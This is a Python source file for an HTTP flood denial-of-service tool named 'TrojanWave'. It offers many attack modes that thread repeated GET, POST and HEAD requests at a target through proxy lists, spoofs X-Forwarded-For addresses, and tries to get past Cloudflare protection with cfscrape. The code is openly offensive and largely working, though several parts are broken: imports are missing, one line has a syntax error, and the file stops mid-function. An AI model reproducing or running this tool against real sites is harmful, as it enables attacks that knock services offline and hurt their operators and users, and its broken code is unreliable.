#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import secrets
l7 = ["CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "OSTRESS", "DYN", "SLOW", "HEAD", "HIT", "NULL", "COOKIE", "BRUST", "PPS", "EVEN", "GSB", "DGB", "AVB"]
to = ["DNS", "PING", "CHECK", "DSTAT", "INFO"]
ot = ["STOP", "TOOLS", "HELP"]
methods = l7
methodsl = l7 + to + ot


def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled


def start_attack(method, threads, event, socks_type):
    global out_file
    # layer7
    cmethod = str(method.upper())
    if (cmethod != "HIT")  and (cmethod != "OSTRESS"):
        out_file = str("files/proxys/" + sys.argv[5])
        proxydl(out_file, socks_type)
        print("{} Attack Started To {}:{} For {} Seconds With {}/{} Proxy ".format(method, target, port, sys.argv[7],len(proxies), str(nums)))
    else:
        print("{} Attack Started To {}:{} For {} Seconds".format(method, target, port, sys.argv[7]))
    try:
        if method == "post":
            for _ in range(threads):
                threading.Thread(target=post, args=(event, socks_type), daemon=True).start()
        elif method == "brust":
            for _ in range(threads):
                threading.Thread(target=brust, args=(event, socks_type), daemon=True).start()
        elif method == "get":
            for _ in range(threads):
                threading.Thread(target=http, args=(event, socks_type), daemon=True).start()
        elif method == "pps":
            for _ in range(threads):
                threading.Thread(target=pps, args=(event, socks_type), daemon=True).start()
        elif method == "even":
            for _ in range(threads):
                threading.Thread(target=even, args=(event, socks_type), daemon=True).start()
        elif method == "ovh":
            for _ in range(threads):
                threading.Thread(target=ovh, args=(event, socks_type), daemon=True).start()
        elif method == "capb":
            for _ in range(threads):
                threading.Thread(target=capb, args=(event, socks_type), daemon=True).start()
        elif method == "cookie":
            for _ in range(threads):
                threading.Thread(target=cookie, args=(event, socks_type), daemon=True).start()
        elif method == "bypass":
            for _ in range(threads):
                threading.Thread(target=bypass, args=(event, socks_type), daemon=True).start()
        elif method == "head":
            for _ in range(threads):
                threading.Thread(target=head, args=(event, socks_type), daemon=True).start()
        elif method == "stress":
            for _ in range(threads):
                threading.Thread(target=stress, args=(event, socks_type), daemon=True).start()
        elif method == "ostress":
            for _ in range(threads):
                threading.Thread(target=ostress, args=(event, socks_type), daemon=True).start()
        elif method == "null":
            for _ in range(threads):
                threading.Thread(target=null, args=(event, socks_type), daemon=True).start()
        elif method == "cfb":
            for _ in range(threads):
                threading.Thread(target=cfb, args=(event, socks_type), daemon=True).start()
        elif method == "avb":
            for _ in range(threads):
                threading.Thread(target=AVB, args=(event, socks_type), daemon=True).start()
        elif method == "gsb":
            for _ in range(threads):
                threading.Thread(target=gsb, args=(event, socks_type), daemon=True).start()
        elif method == "dgb":
            for _ in range(threads):
                threading.Thread(target=dgb, args=(event, socks_type), daemon=True).start()
        elif method == "dyn":
            for _ in range(threads):
                threading.Thread(target=dyn, args=(event, socks_type), daemon=True).start()
        elif method == "hit":
            for _ in range(threads):
                threading.Thread(target=hit, args=(event, timer), daemon=True).start()
#        elif method == "ran":
#            for _ in range(threads):
#                threading.Thread(target=ran, args=(event, timer), daemon=True).start()


    except:
        pass

def random_data():
    return str(Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
        strings) + Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
        strings))


def Headers(method):
    header = ""
    if method == "get" or method == "head":
        connection = "Connection: Keep-Alive\r\n"
        accept = Choice(acceptall) + "\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + "\r\n\r\n"
    elif method == "cookie":
        connection = "Connection: Keep-Alive\r\n"
        more = "cache-control: no-cache\r\n"
        parm = "pragma: no-cache\r\n"
        up = "upgrade-insecure-requests: 1"
        connection += "Cookies: " + str(secrets.token_urlsafe(16)) + "\r\n"
        accept = Choice(acceptall) + "\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + more + up + parm + "\r\n\r\n"
    elif method == "brust":
        connection = "Connection: Keep-Alive\r\n"
        more = "Cache-Control: max-age=0\r\n"
        more2 = "Via: 1.0 PROXY\r\n"
        proxyd = str(proxy)
        xfor = "X-Forwarded-For: " + proxyd + "\r\n"
        accept = "Accept: */*\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + more + xfor + more2 + "\r\n\r\n"
    elif method == "even":
        up = "Upgrade-Insecure-Requests: 1\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        proxyd = str(proxy)
        xfor = "X-Forwarded-For: " + proxyd + "\r\n"
        header = referer + useragent + up + xfor + "\r\n\r\n"
    elif method == "ovh":
        accept = Choice(acceptall) + "\r\n"
        more = "Connection: keep-alive\r\n"
        connection = "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        up = "Upgrade-Insecure-Requests: 1\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = useragent + more + accept + up + "\r\n\r\n"
    elif method == "pps":
        header = "GET / HTTP/1.1\r\n\r\n"
    elif method == "dyn":
        connection = "Connection: Keep-Alive\r\n"
        accept = Choice(acceptall) + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + "\r\n\r\n"
    elif method == "socket":
        header = ""
    elif method == "null":
        connection = "Connection: null\r\n"
        accept = Choice(acceptall) + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        referer = "Referer: null\r\n"
        useragent = "User-Agent: null\r\n"
        header = referer + useragent + accept + connection + "\r\n\r\n"
    elif method == "post":
        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        refer = "Referer: http://" + target + path + "\r\n"
        user_agent = "User-Agent: " + UserAgent + "\r\n"
        accept = Choice(acceptall) + "\r\n"
        connection = "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        data = str(random._urandom(512))
        length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
        header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
    elif method == "hit":
        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        refer = "Referer: http://" + target + path + "\r\n"
        user_agent = "User-Agent: " + UserAgent + "\r\n"
        connection = "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        accept = Choice(acceptall) + "\r\n"
        data = str(random._urandom(512))
        length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
        header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
#    elif method == "ran":
#        connection = "Connection: Keep-Alive\r\n"
#        more = "Cache-Control: max-age=0\r\n"
#        more2 = "Via: 1.0 PROXY\r\n"
#        proxyd = str(proxy)
#        xfor = "X-Forwarded-For: " + proxyd + "\r\n"
#        accept = "Accept: */*\r\n"
#        referer = "Referer: " + referers + target + path + "\r\n"
#        useragent = "User-Agent: " + UserAgent + "\r\n"
#        header = referer + useragent + accept + connection + more + xfor + more2 + "\r\n\r\n"
    return header


def UrlFixer(original_url):
    global target, path, port, protocol
    original_url = original_url.strip()
    url = ""
    path = "/"
    port = 80
    protocol = "http"
    if original_url[:7] == "http://":
        url = original_url[7:]
    elif original_url[:8] == "https://":
        url = original_url[8:]
        protocol = "https"
    tmp = url.split("/")
    website = tmp[0]
    check = website.split(":")
    if len(check) != 1:
        port = int(check[1])
    else:
        if protocol == "https":
            port = 443
    target = check[0]
    if len(tmp) > 1:
        path = url.replace(website, "", 1)



def stop():
    print('All Attacks Stopped !')
    os.system('pkill python*')
    exit()


def dyn(event, socks_type):
    header = Headers("dyn")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + random_data() + "." + target + "\r\n"

    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def http(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + "?" + random_data() + str(random._urandom(1444)+ " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()

def capb(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()

def ovh(event, socks_type):
    header = Headers("ovh")
    proxy = Choice(proxies).strip().split(":")
    get_host = "HEAD " + path + "/" + str(Intn(1111111111, 9999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()

            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def pps(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    request = Headers("pps")
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()

            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def even(event, socks_type):
    global proxy
    proxy = Choice(proxies).strip().split(":")
    header = Headers("even")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()

            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def brust(event, socks_type):
    global proxy
    proxy = Choice(proxies).strip().split(":")
    header = Headers("brust")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()

            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def cookie(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("cookie")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()

            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def cfb(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + "?" + random_data() + str(random._urandom(1444)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()

            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            cfscrape.create_scraper(sess=s)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()




def AVB(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    payload = str(random._urandom(64))
    while time.time() < timer:
        try:
            s = cfscrape.create_scraper()
            if socks_type == 5 :
                s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
            if socks_type == 1:
                s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(proxy[1])
                s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(proxy[1])
            if protocol == "https":
                s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
            try:
                for _ in range(multiple):
                    s.post(sys.argv[2], timeout=1, data=payload)
            except:
                s.close()
        except:
            s.close()


def bypass(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    payload = str(random._urandom(64))
    while time.time() < timer:
        try:
            s = requests.Session()
            if socks_type == 5:
                s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
            if socks_type == 1:
                s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(proxy[1])
                s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(proxy[1])
            if protocol == "https":
                s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
            try:
                for _ in range(multiple):
                    s.post(sys.argv[2], timeout=1, data=payload)
            except:
                s.close()
        except:
            s.close()


def dgb(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    while time.time() < timer:
        try:
            s = cfscrape.create_scraper()
            if socks_type == 5:
                s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
            if socks_type == 1:
                s.proxies['http'] = 'http://' + str(proxy[0]) + ":" + str(proxy[1])
                s.proxies['https'] = 'https://' + str(proxy[0]) + ":" + str(proxy[1])
            if protocol == "https":
                s.DEFAULT_CIPHERS = "TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES256-SHA384"
            try:
                sleep(5)
                for _ in range(multiple):
                    s.get(sys.argv[2])
            except:
                s.close()
        except:
            s.close()


def head(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("head")
    head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = head_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()

            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def null(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("null")
    head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = head_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()

            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def gsb(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("head")
    head_host = "HEAD " + path + "?q=" + str(Intn(000000000, 999999999)) + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = head_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()

            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                sleep(5)
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def hit(event, timer):
    global s
    request = Headers("hit")
    event.wait()
    while time.time() < timer:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(target), int(port)))
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def cfbc(event, socks_type):
    request = Headers("cfb")
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()

            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def post(event, socks_type):
    request = Headers("post")
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()

            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def stress(event, socks_type):
    request = Headers("stress")
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()

            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def ostress(event, timer):
    request = Headers("stress")
    event.wait()
    while time.time() < timer:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(target), int(port)))
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()


socket_list = []
t = 0

def slow(conn, socks_type):
    global t
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    header = Headers("get")
    request = get_host + header
    while time.time() < timer:
        try:
            s = socks.socksocket()

            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(conn):
                try:
                    s.send(request) * conn
                    t += 1
                    sys.stdout.write("Connections = " + t + "\r")
                    sys.stdout.flush()
                except:
                    s.close()
                    proxy = Choice(proxies).strip().split(":")
        except:
            s.close()
            proxy = Choice(proxies).strip().split(":")



def checking(lines, socks_type, ms):
    global nums, proxies
    proxy = lines.strip().split(":")
    if len(proxy) != 2:
        return
    err = 0
    while True:
        if err == 3:
            break
        try:
            s = socks.socksocket()
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.settimeout(ms)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
            s.close()
            break
        except:
            err += 1
    nums += 1


nums = 0


def check_socks(ms):
    global nums
    thread_list = []
    for lines in list(proxies):
        if choice == "5":
            th = threading.Thread(target=checking, args=(lines, 5, ms,))
            th.start()
        if choice == "1":
            th = threading.Thread(target=checking, args=(lines, 1, ms,))
            th.start()
        thread_list.append(th)
        sleep(0.01)
    for th in list(thread_list):
        th.join()
    ans = "y"
    if ans == "y" or ans == "":
        if choice == "5":
            with open(out_file, 'wb') as fp:
                for lines in list(proxies):
                    fp.write(bytes(lines, encoding='utf8'))
            fp.close()
        elif choice == "1":
            with open(out_file, 'wb') as fp:
                for lines in list(proxies):
                    fp.write(bytes(lines, encoding='utf8'))
            fp.close()


def check_list(socks_file):
    temp = open(socks_file).readlines()
    temp_list = []
    for i in temp:
        if i not in temp_list:
            if ':' in i:
                temp_list.append(i)
    rfile = open(socks_file, "wb")
    for i in list(temp_list):
        rfile.write(bytes(i, encoding='utf-8'))
    rfile.close()


def main():
    global proxies, multiple, choice, timer, out_file
    method = str(sys.argv[1]).lower()
    
    out_file = str("files/proxys/" + sys.argv[5])
    if not os.path.exists(out_file):
        makefile(out_file)

    if method == "check":
        proxydl(out_file, socks_type)
        exit()
    if method == "stop":
        url = str(sys.argv[2]).strip()
        UrlFixer(url)
        stop()
    elif (method == "help") or (method == "h"):
        usge()
    elif (method == "check"):
        pass
    elif str(method.upper()) not in str(methods):
        print("method 404")
        exit()
    timer = int(time.time()) + int(sys.argv[7])
    url = str(sys.argv[2]).strip()
    UrlFixer(url)
    choice = str(sys.argv[3]).strip()
    if choice != "5" and choice != "1":
        print("Socks Type Not Found [5, 1]")
        exit()
    if choice == "1":
        socks_type = 1
    else:
        socks_type = 5
    threads = int(sys.argv[4])
    proxies = open(out_file).readlines()
    if method == "slow":
        conn = threads
        proxydl(out_file, socks_type)
        print("{} Attack Started To {}:{} For {} Seconds With {}/{} Proxy ".format(method, target, port, sys.argv[7],len(proxies), str(nums)))

        for _ in range(conn):
            threading.Thread(target=slow, args=(conn, socks_type), daemon=True).start()
    else:
        multiple = str((sys.argv[6]))
        if multiple == "":
            multiple = int(100)
        else:
            multiple = int(multiple)
        event = threading.Event()
        start_attack(method, threads, event, socks_type)
        event.clear()
        event.set()
    while True:
        try:
            sleep(0.1)
        except KeyboardInterrupt:
            break


def proxydl(out_file, socks_type):
    global proxies, multiple, choice, data
    ms = 1
    if socks_type == 1:
        socktyper = "HTTP"
    if socks_type == 5:
        socktyper = "SOCKS5"

    print("Loading {}'s proxy pls wait".format(socktyper))
    proxies = open(str(out_file)).readlines()
    check_list(out_file)
    check_socks(ms)


bds = 0


# layer tool :||||||||||||
def toolgui():
    global bds
    tos = str(to).replace("'", "").replace("[", "").replace("]", "").replace(",", "\n")
    if bds == 0:
        print('''
Tools:
 ''' + tos+ '''
Other:
 Clear
 Exit
        ''')
    bds = 1
    tool = input(socket.gethostname() + "@"+name+":~# ").lower()
    if tool != "e" and (tool != "exit") and (tool != "q") and (tool != "quit") and (tool != "logout") and (
            tool != "close"):
        pass
    else:
        exit()
    if tool == "dstat":
        print(tool + ": command ready")
        return tools()
    elif tool == "dns":
        return tools()
    elif tool == "check":
        domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
        check(domain)
        return tools()
    elif tool == "ping":
        domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
        piger(domain)
        return tools()
    elif tool == "info":
        domain = input(socket.gethostname() + '@'+name+'}:~/give-me-ipaddress# ')
        piger(domain)
        return tools()
    elif (tool == "help") or (tool == "h") or (tool == "?"):
        tos = str(to).replace("'", "").replace("[", "").replace("]", "").replace(",", "\n")
        print('''
Tools:
 {tos}
Other:
 Clear
 Exit
        ''')
        return tools()
    elif (tool == "cls") or (tool == 'clear') or (tool == 'c'):
        print("\033[H\033[J")
        return tools()
    elif not tool:
        return tools()

    elif " " in tool:
        return tools()
    elif "        " in tool:
        return tools()
    elif "  " in tool:
        return tools()
    elif "\n" in tool:
        return tools()
    elif "\r" in tool:
        return tools()

    else:
        print(tool + ": command not found")
        return tools()


def tools():
    global domain, name
    name = "TrojanWave"
    try:
        tool = sys.argv[2].lower()
        if tool != "dstat":
            domain = sys.argv[3]
            if str('.') not in str(domain):
                print('address not found')
                toolgui()
        if tool == "dns":
            print(tool + ": comming soon !")
        elif tool == "check":
            check(domain)
        elif tool == "ping":
            piger(domain)
        elif tool == "dstat":
            address = requests.get('http://ipinfo.io/ip', headers={"User-Agent": UserAgent, }).text
            print('now please attack to {address}')
            os.system('dstat')
        else:
            print('tool not found')
            toolgui()
    except IndexError:
        toolgui()



def check(domain):
    if str("http") not in str(domain):
        domain = "http://" + domain
    print('please wait ...')
    r = requests.get(domain, timeout=20)
    if str("50") in str(r.status_code):
        die = "OFFLINE"
    else:
        die = "ONLINE"
    print('\nstatus_code: '+r.status_code)
    print('status: '+die+'\n')


def piger(siye):
    if str("https") in str(siye):
        domain = str(siye).replace('https', '').replace('/', '').replace(':', '')
    elif str("http") in str(siye):
